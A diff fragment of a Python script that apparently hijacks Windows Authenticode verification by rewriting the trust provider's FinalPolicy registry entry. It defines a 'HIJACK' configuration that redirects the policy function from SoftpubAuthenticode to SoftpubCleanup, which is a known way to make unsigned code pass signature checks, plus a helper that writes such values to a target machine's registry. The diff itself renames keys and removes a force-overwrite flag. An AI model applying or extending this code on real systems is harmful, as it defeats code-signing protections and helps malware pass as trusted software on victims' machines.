@@ -201,13 +201,13 @@ CLEAN_CONFIG = {
 FINALPOLICY_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
 
 FINALPOLICY_HIJACK = {
-    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
-    "FuncName": "SoftpubCleanup"
+    "$DLL": "C:\\Windows\\System32\\WINTRUST.DLL",
+    "$Function": "SoftpubCleanup"
 }
 
 FINALPOLICY_CLEAN = {
-    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
-    "FuncName": "SoftpubAuthenticode"
+    "$DLL": "C:\\Windows\\System32\\WINTRUST.DLL",
+    "$Function": "SoftpubAuthenticode"
 }
 
 FINALPOLICY_BASE_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy"
@@ -229,8 +229,7 @@ def run_reg_cmd(reg_tool, target, key, value, data):
         "-keyName", key, 
         "-v", value, 
         "-vt", "REG_SZ", 
-        "-vd", data,
-        "-force" # Force overwrite
+        "-vd", data
     ]
     
     print(f"[*] Setting {key}\\{value} -> {data}")
